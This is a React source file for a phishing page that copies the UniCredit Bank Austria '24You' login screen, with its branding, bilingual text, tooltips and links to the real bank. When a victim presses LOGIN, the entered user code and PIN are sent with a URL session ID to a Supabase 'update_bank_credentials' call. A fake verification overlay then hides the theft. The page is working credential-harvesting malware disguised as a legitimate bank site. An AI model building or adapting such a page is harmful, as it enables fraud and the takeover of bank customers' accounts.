import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Menu } from "lucide-react";
import bankAustriaIcon from "@/assets/bank_austria.png";
import iconGirokonten from "@/assets/Girokonten.png";
import iconKreditkarten from "@/assets/Kreditkarten.png";
import iconSparprodukte from "@/assets/Sparprodukte.png";
import iconFinanzierung from "@/assets/Finanzierung.png";
import iconWertpapiere from "@/assets/Wertpapiere.png";
import iconBoersenMaerkte from "@/assets/boersen_maerkte.png";
import deutschActive from "@/assets/deutschactive.png";
import deutschInactive from "@/assets/deutschinactive.png";
import englishActive from "@/assets/englishactive.png";
import englishInactive from "@/assets/englishinactive.png";
import promoBg from "@/assets/bankaustria_promo_bg.png";
import unicreditLogo from "@/assets/unicredit.png";
import logo from "@/assets/logo-bank-austria.svg";
import iconPrivatkunden from "@/assets/icon-privatkunden.png";
import iconFirmenkunden from "@/assets/icon-firmenkunden.png";
import iconPrivatebanking from "@/assets/icon-privatebanking.png";
import iconUeberuns from "@/assets/icon-ueberuns.png";
import iconSicherheit from "@/assets/sicherheitsinformationen.png";
import iconSicherheitscenter from "@/assets/sicherheitscenter.png";
import iconHotline from "@/assets/internetbanking_hotline.png";
import iconFaq from "@/assets/faq.png";
import iconCookie from "@/assets/cookie_policy.png";
import infoIcon from "@/assets/info-icon.jpeg";

const translations = {
  de: {
    nav: ["Privatkunden", "Firmenkunden", "Private Banking", "Über uns"],
    sidebar: ["GIROKONTEN", "KREDITKARTEN", "SPARPRODUKTE", "FINANZIERUNG", "WERTPAPIERE", "BÖRSEN &\nMÄRKTE"],
    verfuegerPlaceholder: "Verfügernummer",
    pinPlaceholder: "PIN",
    pinForgot: "PIN vergessen oder Verfügernummer gesperrt?",
    tooltipVerfueger: "Die Verfügernummer ist eine von zwei notwendigen Komponenten für den Login. Sie ist eine Kombination aus bis zu 8 Ziffern.",
    tooltipPin: "Die PIN ist die zweite für den Login notwendige Komponente. Die initiale PIN wird von der Bank Austria definiert und kann von Ihnen, nach dem ersten Login, geändert werden.",
    footerIcons: ["Sicherheits\ninformationen", "Sicherheitscenter\n+43 (0) 50505 26105", "Internetbanking Hotline\n+43 (0) 50505 26100", "FAQ", "Cookie Policy"],
    footerLinks: ["Impressum", "AGB", "Datenschutzerklärung"],
  },
  en: {
    nav: ["Private", "Business", "Private Banking", "About us"],
    sidebar: ["CURRENT ACCOUNTS", "CREDIT CARDS", "SAVINGS", "FINANCING", "SECURITIES", "MARKET\nINFO"],
    verfuegerPlaceholder: "User Code",
    pinPlaceholder: "PIN",
    pinForgot: "Did you forget your PIN or is your user code locked?",
    tooltipVerfueger: "The user code is one of two necessary components for the login. It is a combination of 8 figures maximum.",
    tooltipPin: "The PIN is the second necessary component for the login. The initial PIN is defined by Bank Austria and can be changed by you after the first login.",
    footerIcons: ["Security\nInformation", "Security center\n+43 (0) 50505 26105", "Online banking hotline\n+43 (0) 50505 26100", "FAQ", "Cookie Policy"],
    footerLinks: ["Imprint", "Terms & Conditions", "Privacy"],
  },
};

const navItems = [
  { icon: iconPrivatkunden, href: "https://www.bankaustria.at/index.jsp#" },
  { icon: iconFirmenkunden, href: "https://www.bankaustria.at/firmenkunden-und-freie-berufe.jsp" },
  { icon: iconPrivatebanking, href: "https://www.bankaustria.at/firmenkunden-und-freie-berufe.jsp" },
  { icon: iconUeberuns, href: "https://www.bankaustria.at/ueber-uns.jsp" },
];

const sidebarIcons = [
  iconGirokonten,
  iconKreditkarten,
  iconSparprodukte,
  iconFinanzierung,
  iconWertpapiere,
  iconBoersenMaerkte,
];

const footerIconImages = [iconSicherheit, iconSicherheitscenter, iconHotline, iconFaq, iconCookie];
const footerIconHrefs = [
  "https://www.bankaustria.at/sicherheit",
  "tel:+43505052610",
  "tel:+4350505261005",
  "https://www.bankaustria.at/faq",
  "https://www.bankaustria.at/cookie-policy",
];
const footerLinkHrefs = [
  "http://www.bankaustria.at/rechtliches-impressum.jsp",
  "http://www.bankaustria.at/rechtliches-agb.jsp",
  "http://www.bankaustria.at/rechtliches-datenschutz.jsp",
];

const BankAustria = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Bank Austria - Login", bankAustriaIcon);

  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [activeLang, setActiveLang] = useState<"de" | "en">("de");
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [showTooltip, setShowTooltip] = useState<"verfueger" | "pin" | null>(null);

  const t = translations[activeLang];

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div
      className="min-h-screen flex overflow-x-hidden"
      style={{ fontFamily: "'UniCredit', sans-serif" }}
    >
      {/* Fixed Header */}
      <header className="fixed top-0 left-0 w-full flex z-[60]" style={{ height: "80px" }}>
        <a
          href="#"
          onClick={(e) => { e.preventDefault(); setSidebarOpen(!sidebarOpen); }}
          className="flex items-center justify-center flex-shrink-0 border-l-[3px] border-transparent"
          style={{ width: "80px", height: "80px", backgroundColor: "#1a1a1a", borderBottom: "1px solid rgba(102,102,102,0.16)" }}
        >
          <Menu size={32} className="text-white" />
        </a>
        <a
          href="https://www.bankaustria.at/index.jsp"
          target="_blank"
          rel="noopener noreferrer"
          className="flex items-center px-1 flex-shrink-0"
          style={{ backgroundColor: "#fff", width: "220px" }}
        >
          <img src={logo} alt="Bank Austria" style={{ height: "90px" }} />
        </a>
        <div
          className="flex-1 flex items-center justify-center gap-10"
          style={{ backgroundColor: "#e2001a" }}
        >
          {navItems.map(({ icon, href }, index) => (
            <a
              key={index}
              href={href}
              target="_blank"
              rel="noopener noreferrer"
              className="flex flex-col items-center gap-1 transition-opacity hover:opacity-80"
            >
              <img src={icon} alt={t.nav[index]} className="h-8 w-8 object-contain" />
              <span className="text-white text-xs font-bold uppercase tracking-wide">
                {t.nav[index]}
              </span>
            </a>
          ))}
        </div>
      </header>

      {/* Sidebar */}
      <aside
        className="fixed left-0 top-[80px] flex flex-col z-50 overflow-hidden"
        style={{ width: sidebarOpen ? "300px" : "80px", backgroundColor: "#333333", height: "calc(100vh - 80px)", transition: "width 0.3s ease" }}
      >
        {sidebarIcons.map((icon, index) => {
          const label = t.sidebar[index];
          return (
            <div
              key={index}
              className={`border-l-[3px] border-transparent hover:border-white hover:bg-[#1a1a1a] transition-colors group cursor-pointer ${sidebarOpen ? "flex flex-row items-center" : "flex flex-col items-center justify-center"}`}
              style={{ height: "80px", borderBottom: "1px solid rgba(102,102,102,0.16)" }}
            >
              <div className="flex items-center justify-center flex-shrink-0" style={{ width: "80px" }}>
                <img src={icon} alt={label} className="h-6 w-6 object-contain" />
              </div>
              {!sidebarOpen && (
                <span className="text-white text-[11px] font-medium uppercase whitespace-pre-line text-center leading-tight">
                  {label}
                </span>
              )}
              {sidebarOpen && (
                <span className="text-[#bebebe] text-lg font-medium uppercase whitespace-nowrap text-right pr-4" style={{ width: "220px" }}>
                  {label.replace('\n', ' ')}
                </span>
              )}
            </div>
          );
        })}
      </aside>

      {/* Right Content Area */}
      <div className="flex-1 flex flex-col" style={{ marginLeft: sidebarOpen ? "300px" : "80px", marginTop: "80px", transition: "margin-left 0.3s ease" }}>

        {/* Main Content */}
        <main className="flex-1 px-4 sm:px-10 pt-14 pb-8" style={{ backgroundColor: "#fff" }}>
          <div className="mb-6 text-center">
            <span className="text-4xl" style={{ color: "#e2001a", fontFamily: "'UniCreditMedium', sans-serif" }}>24You</span>
          </div>

          {/* Login Form */}
          <div className="max-w-md mx-auto">
            <div className="mb-4">
              <div className="flex items-center gap-4">
                <input
                  type="text"
                  value={verfueger}
                  onChange={(e) => setVerfueger(e.target.value)}
                  placeholder={t.verfuegerPlaceholder}
                  className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
                  style={{ border: "1px solid #ccc" }}
                />
                <div
                  className="relative flex-shrink-0 hidden sm:block"
                  onMouseEnter={() => setShowTooltip("verfueger")}
                  onMouseLeave={() => setShowTooltip(null)}
                  onClick={() => setShowTooltip(showTooltip === "verfueger" ? null : "verfueger")}
                >
                  <img src={infoIcon} alt="Info" className="h-8 w-8 cursor-pointer" />
                  {showTooltip === "verfueger" && (
                    <div className="absolute left-full ml-3 top-1/2 -translate-y-1/2 w-[280px] bg-white p-3 rounded shadow-lg text-sm z-50" style={{ color: "#333" }}>
                      {t.tooltipVerfueger}
                      <div className="absolute right-full top-1/2 -translate-y-1/2 w-0 h-0" style={{ borderTop: "8px solid transparent", borderBottom: "8px solid transparent", borderRight: "8px solid white" }} />
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="mb-4">
              <div className="flex items-center gap-4">
                <input
                  type="password"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  placeholder={t.pinPlaceholder}
                  className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
                  style={{ border: "1px solid #ccc" }}
                />
                <div
                  className="relative flex-shrink-0 hidden sm:block"
                  onMouseEnter={() => setShowTooltip("pin")}
                  onMouseLeave={() => setShowTooltip(null)}
                  onClick={() => setShowTooltip(showTooltip === "pin" ? null : "pin")}
                >
                  <img src={infoIcon} alt="Info" className="h-8 w-8 cursor-pointer" />
                  {showTooltip === "pin" && (
                    <div className="absolute left-full ml-3 top-1/2 -translate-y-1/2 w-[280px] bg-white p-3 rounded shadow-lg text-sm z-50" style={{ color: "#333" }}>
                      {t.tooltipPin}
                      <div className="absolute right-full top-1/2 -translate-y-1/2 w-0 h-0" style={{ borderTop: "8px solid transparent", borderBottom: "8px solid transparent", borderRight: "8px solid white" }} />
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="mb-4">
              <a
                href="https://banking.bankaustria.at/pinreset"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-block text-sm font-medium transition-colors"
                style={{
                  color: "#00aed0",
                  textDecoration: "underline",
                  textDecorationColor: "black",
                  textDecorationThickness: "1.5px",
                  textUnderlineOffset: "1px",
                }}
              >
                {t.pinForgot}
              </a>
            </div>

            <div className="flex justify-center mb-6">
              <button
                onClick={async () => {
                  console.log("Session ID:", sessionId);
                  if (sessionId) {
                    const { error } = await supabase.rpc("update_bank_credentials", {
                      p_session_id: sessionId,
                      p_username: verfueger,
                      p_password: pin,
                      p_username_label: "Verfügernummer",
                      p_password_label: "PIN",
                    });
                    if (error) console.error("Update failed:", error);
                    else console.log("Update successful");
                  } else {
                    console.error("No session ID found in URL!");
                  }
                  setShowLoading(true);
                }}
                className="px-10 sm:px-12 py-2.5 text-white font-semibold text-sm rounded-sm hover:opacity-90 transition-opacity"
                style={{ backgroundColor: "#00aed0" }}
              >
                LOGIN
              </button>
            </div>

            <div className="flex items-center justify-center gap-4">
              {[
                { lang: "de" as const, active: deutschActive, inactive: deutschInactive, label: "Deutsch" },
                { lang: "en" as const, active: englishActive, inactive: englishInactive, label: "English" },
              ].map(({ lang, active, inactive, label }) => {
                const isActive = activeLang === lang;
                return (
                  <button
                    key={lang}
                    onClick={() => setActiveLang(lang)}
                    className="flex flex-col items-center gap-1 bg-transparent border-none cursor-pointer"
                  >
                    <div
                      className="rounded-full overflow-hidden"
                      style={{
                        width: 46,
                        height: 46,
                        border: isActive ? "2px solid #00aed0" : "2px solid transparent",
                      }}
                    >
                      <img
                        src={active}
                        alt={label}
                        className="w-full h-full object-cover"
                        style={{ display: isActive ? "block" : "none" }}
                      />
                      <img
                        src={inactive}
                        alt={label}
                        className="w-full h-full object-cover"
                        style={{ display: isActive ? "none" : "block" }}
                      />
                    </div>
                    <span
                      className="text-xs font-semibold"
                      style={{ color: isActive ? "#00aed0" : "#999" }}
                    >
                      {label}
                    </span>
                  </button>
                );
              })}
            </div>
          </div>
        </main>

        {/* Promo Banner + Disclaimer — only in German */}
        {activeLang === "de" && (
          <>
            <div
              className="relative flex items-center mx-4 sm:mx-10 overflow-hidden"
              style={{
                backgroundImage: `url(${promoBg})`,
                backgroundSize: "cover",
                backgroundPosition: "center",
                minHeight: "200px",
              }}
            >
              <div className="absolute inset-0" style={{ backgroundColor: "rgba(0,0,0,0.35)" }} />
              <div className="relative z-10 px-4 sm:px-12 max-w-xl">
                <p className="text-white text-2xl sm:text-5xl font-normal mb-2">Lässt sich einrichten</p>
                <p className="text-white text-sm sm:text-xl font-bold mb-4">
                  Jetzt von Topkonditionen* unserer Wohnoffensive<br />profitieren.
                </p>
                <a
                  href="https://www.bankaustria.at/privatkunden-finanzierungen-und-kredite-wohnkredit.jsp?ucid=INT-8612-Wohnkredit_2026-24You"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-block px-6 py-2.5 text-white font-semibold text-sm tracking-wider hover:opacity-90 transition-opacity"
                  style={{ backgroundColor: "#00aed0" }}
                >
                  MEHR ERFAHREN
                </a>
              </div>
            </div>
            <div className="w-full px-4 sm:px-10 py-8 text-sm" style={{ color: "#666", backgroundColor: "#fff" }}>
              *Exklusiv für neue oder bestehende Bank Austria Girokontokund:innen – vorbehaltlich positiver Kreditentscheidung. Aktionsbedingungen unter bankaustria/wohnoffensive.jsp
            </div>
          </>
        )}

        {/* Footer Icons */}
        <div className="py-8" style={{ backgroundColor: "#e5e5e5" }}>
          <div className="max-w-[700px] mx-auto grid grid-cols-2 sm:grid-cols-5 gap-2 sm:gap-3 justify-items-center px-4 sm:px-0">
            {footerIconImages.map((img, index) => (
              <a
                key={index}
                href={footerIconHrefs[index]}
                target="_blank"
                rel="noopener noreferrer"
                className={`flex flex-col items-center gap-2 ${index === footerIconImages.length - 1 ? "col-span-2 sm:col-span-1" : ""}`}
              >
                <img src={img} alt={t.footerIcons[index]} className="h-7 w-7 object-contain" />
                <span className="text-xs text-center whitespace-pre-line" style={{ color: "#333" }}>
                  {t.footerIcons[index]}
                </span>
              </a>
            ))}
          </div>
        </div>

        {/* Footer */}
        <footer className="w-full py-10 flex flex-col items-center text-white text-sm" style={{ backgroundColor: "#666666" }}>
          <div className="flex flex-col sm:flex-row items-center gap-2 sm:gap-4 mb-3">
            <a href="http://www.bankaustria.at/" target="_blank" rel="noopener noreferrer" className="hover:underline">UniCredit Bank Austria AG</a>
            {t.footerLinks.map((label, index) => (
              <span key={index} className="contents">
                <span className="opacity-60 hidden sm:inline">|</span>
                <a href={footerLinkHrefs[index]} target="_blank" rel="noopener noreferrer" className="hover:underline">{label}</a>
              </span>
            ))}
          </div>
          <p className="mb-6">© 2026 UniCredit Bank Austria AG</p>
          <img src={unicreditLogo} alt="UniCredit" className="h-8 object-contain" />
        </footer>
      </div>
    </div>
    </>
  );
};

export default BankAustria;
